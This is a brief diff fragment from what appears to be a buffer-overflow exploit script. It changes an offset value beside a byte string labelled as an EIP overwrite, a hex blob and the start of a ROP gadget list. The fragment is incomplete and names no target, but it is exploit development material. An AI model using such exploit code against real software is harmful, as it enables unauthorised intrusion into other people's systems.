@@ -19,7 +19,7 @@ file+=b'd9808878'     #EIP
 file+="9149414941444347FFFFFFFFFFFAFFFFBFFFFFFF"
 
 
-magic_offset = 0x47c08
+magic_offset = 0x46c08
 
 
 rop_gadgets = [
